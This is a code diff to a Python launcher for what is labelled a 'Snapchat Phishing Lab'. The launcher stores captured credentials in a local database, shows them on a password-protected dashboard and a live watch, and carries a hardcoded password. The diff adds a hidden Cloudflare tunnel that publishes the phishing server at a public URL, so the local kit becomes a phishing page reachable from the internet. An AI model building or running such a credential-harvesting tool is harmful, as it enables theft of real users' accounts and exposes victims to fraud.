@@ -3,16 +3,20 @@ Snapchat Phishing Lab — Purple Team
 Usage : python launcher.py
 """
 
-import os, sys, json, sqlite3, time, threading, socket, webbrowser
+import os, sys, json, sqlite3, time, threading, socket, webbrowser, subprocess, re
 from datetime import datetime
 
 BASE = os.path.dirname(os.path.abspath(__file__))
 DB_PATH = os.path.join(BASE, "captured_credentials.db")
+CF_PATH = os.path.join(BASE, "cloudflared.exe")
 ACCESS_PW = "76247010aidafamoussa"
 
 sys.path.insert(0, BASE)
 
 flask_thread = None
+cf_thread = None
+cf_url = None
+cf_proc = None
 
 def db():
     return sqlite3.connect(DB_PATH)
@@ -67,6 +71,59 @@ def stop_server():
     except:
         pass
 
+def start_tunnel():
+    global cf_thread, cf_url, cf_proc
+    if not os.path.exists(CF_PATH):
+        return None
+    cf_url = None
+    cf_proc = None
+    cf_thread = threading.Thread(target=_run_tunnel, daemon=True)
+    cf_thread.start()
+    for _ in range(30):
+        if cf_url:
+            return cf_url
+        time.sleep(0.5)
+    return None
+
+def _run_tunnel():
+    global cf_url, cf_proc
+    try:
+        proc = subprocess.Popen(
+            [CF_PATH, "tunnel", "--url", "http://127.0.0.1:5000"],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        cf_proc = proc
+        if not proc.stdout:
+            return
+        for line in iter(proc.stdout.readline, b''):
+            text = line.decode("utf-8", errors="replace").strip()
+            m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', text)
+            if m:
+                cf_url = m.group(0)
+            if "failed" in text.lower() or "error" in text.lower():
+                pass
+    except:
+        pass
+
+def stop_tunnel():
+    global cf_proc, cf_url
+    if cf_proc:
+        try:
+            cf_proc.terminate()
+            cf_proc.wait(timeout=5)
+        except:
+            try: cf_proc.kill()
+            except: pass
+        cf_proc = None
+    cf_url = None
+
+def server_url():
+    url = "http://localhost:5000"
+    if cf_url:
+        url = f"{url}  |  CF: {cf_url}"
+    return url
+
 def menu():
     while True:
         cls()
@@ -74,28 +131,46 @@ def menu():
         status = "🟢 EN LIGNE" if is_server_running() else "🔴 ARRETE"
         show_dashboard_preview()
         print(f"\n  Serveur : http://localhost:5000  |  {status}")
+        if cf_url and is_server_running():
+            print(f"  Tunnel   : {cf_url}")
         print(f"  {'─'*50}")
         print("""
   ┌──────────────────────────────────────────────────┐
-  │  [1] LANCER LE SERVEUR    [2] TABLEAU DE BORD    │
-  │  [3] WATCH LIVE           [4] NAVIGATEUR          │
-  │  [0] QUITTER                                      │
+  │  [1] LANCER LOCAL       [2] TABLEAU DE BORD     │
+  │  [3] LANCER CLOUDFLARE  [4] WATCH LIVE          │
+  │  [5] NAVIGATEUR         [0] QUITTER             │
   └──────────────────────────────────────────────────┘
         """)
         c = input("  > ").strip()
         if c == "1":
+            stop_tunnel()
             if start_server():
-                print("  ✓ Serveur lance sur http://localhost:5000\n")
+                print("\n  ✓ http://localhost:5000\n")
             else:
                 print("  ✗ Echec du demarrage\n")
             input("  Entree...")
+        elif c == "3":
+            if not os.path.exists(CF_PATH):
+                print(f"\n  ✗ cloudflared.exe introuvable dans le dossier.\n")
+                input("  Entree..."); continue
+            if not start_server():
+                print("  ✗ Echec du demarrage du serveur\n")
+                input("  Entree..."); continue
+            print("\n  Demarrage du tunnel Cloudflare...")
+            url = start_tunnel()
+            if url:
+                print(f"  ✓ Tunnel actif : {url}\n")
+            else:
+                print("  ✗ Echec du tunnel\n")
+            input("  Entree...")
         elif c == "2":
             if check_pw(): dashboard()
-        elif c == "3":
-            watch_live()
         elif c == "4":
+            watch_live()
+        elif c == "5":
             open_browser()
         elif c == "0":
+            stop_tunnel()
             print("\n  Bye.\n"); break
 
 def show_dashboard_preview():
@@ -121,7 +196,7 @@ def show_dashboard_preview():
 
 def watch_live():
     if not is_server_running():
-        print("\n  ✗ Le serveur n'est pas lance. Option [1] d'abord.\n")
+        print("\n  ✗ Le serveur n'est pas lance. Option [1] ou [3] d'abord.\n")
         input("  Entree..."); return
     last_id = 0
     try:
@@ -153,8 +228,9 @@ def check_pw():
     return True
 
 def open_browser():
-    webbrowser.open("http://localhost:5000")
-    print("\n  ✓ Navigateur ouvert\n")
+    target = cf_url if cf_url else "http://localhost:5000"
+    webbrowser.open(target)
+    print(f"\n  ✓ {target}\n")
     input("  Entree...")
 
 def dashboard():
@@ -293,4 +369,5 @@ if __name__ == "__main__":
     try:
         menu()
     except KeyboardInterrupt:
+        stop_tunnel()
         print("\n\n  Bye.\n")
